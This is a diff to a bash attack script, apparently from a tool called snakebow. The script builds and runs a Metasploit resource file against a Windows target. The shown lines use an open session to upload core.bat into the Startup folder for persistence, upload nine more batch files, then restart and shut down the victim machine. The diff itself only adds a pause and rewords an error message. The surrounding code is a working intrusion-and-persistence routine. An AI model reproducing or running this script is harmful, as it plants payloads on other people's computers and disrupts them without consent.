@@ -55,6 +55,7 @@ if [ $( ping -c 1 $tip | grep "1 received" | wc -c ) -eq "60" ]; then
          echo -e "sessions -i 1 -C cd C:/ProgramData/Microsoft/Windows/'Start Menu'/Programs/Startup" >> snakebow.rc
          echo -e "sessions -i 1 -C upload core.bat" >> snakebow.rc
          echo -e "sessions -i 1 -C cd ..\nsessions -i 1 -C upload cmd1.bat\nsessions -i 1 -C upload cmd2.bat\nsessions -i 1 -C upload cmd3.bat\nsessions -i 1 -C upload cmd4.bat\nsessions -i 1 -C upload cmd5.bat\nsessions -i 1 -C upload cmd6.bat\nsessions -i 1 -C upload cmd7.bat\nsessions -i 1 -C upload cmd8.bat\nsessions -i 1 -C upload cmd9.bat\nrestart\nshutdown\nsessions -k 1\nexit -y" >> snakebow.rc
+         sleep 2
          msfconsole -r snakebow.rc
          echo -e "\n Monitoring Target Behaviour , Please Wait!"
          sleep 11
@@ -72,6 +73,6 @@ if [ $( ping -c 1 $tip | grep "1 received" | wc -c ) -eq "60" ]; then
    fi
 else
    sleep 1
-   echo "Target Seem Down , Try Again Later !"
+   echo "Target Unreachable , Try Again Later !"
 fi
 echo -e "\e[0m"
